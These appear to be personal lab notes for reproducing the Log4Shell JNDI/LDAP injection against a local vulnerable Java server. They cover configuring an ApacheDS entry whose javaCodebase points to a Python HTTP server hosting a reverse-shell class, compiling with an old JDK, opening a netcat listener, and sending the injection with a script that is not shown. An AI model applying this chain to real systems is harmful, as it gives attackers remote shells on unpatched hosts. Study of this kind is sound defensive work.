LDAP SERVER DOWNLOAD AND CONFIG:
- download ldapds: sudo apt install apacheds and make sure its active.
- download apache directory studio: https://directory.apache.org/studio/download/download-linux.html
- extract it, then run the executable to open it.
- create new connection: hostname - localhost, port 10389, then click next.
						 in bind dn or user choose uid=admin,ou=system.  in bind password choose "secret".  then click finish.
- create ldap entry:  click on ou=config and then LDAP->new entry, then click next.
						in available object classes search for java, and add javaNamingReference and javaContainer and click next.
						in RDN choose javaFactory in = put Exploit and click next.
						in cn put au, in javaclassName put Exploit. click on the + (above) to add new attribute, and add javaCodebase.
						in javaCodebase put http://localhost:8000/ (which is the path of the http server that we open in the following stage 1, 
						that hold the reverse shell file (Exploit.java))


 
1. in the location that you put the reverse shell file (call it Exploit.java) open a http server: python3 -m http.server 8000
2. run this command in the folder you put the two jar files (that arein the victim folder): export CLASSPATH=$(pwd)/log4j-core-2.14.1.jar:$(pwd)/log4j-api-2.14.1.jar
3. install jpk1.8.0_181 from here:  https://mirrors.huaweicloud.com/java/jdk/8u181-b13/
4. then extract it.
5. compile our files with this version: ~/Downloads/jdk-8u181-linux-x64/jdk1.8.0_181/bin/javac HelloWorldServer.java (the vulnerable http server for the ldap inject)
										~/Downloads/jdk-8u181-linux-x64/jdk1.8.0_181/bin/javac Exploit.java (this is the reverse shell file)
    
6. then run our vulnerable server with this version: ~/Downloads/jdk-8u181-linux-x64/jdk1.8.0_181/bin/java HelloWorldServer		
7. listen with netcat on the port used in the reverse shell file: nc -lvnp 5000
8. run req.py script to inject the ldap request to the vulnerable server, and ldap will fetch the (Exploit)file to the server we opened in step 1, and provide a reverse shell for us.
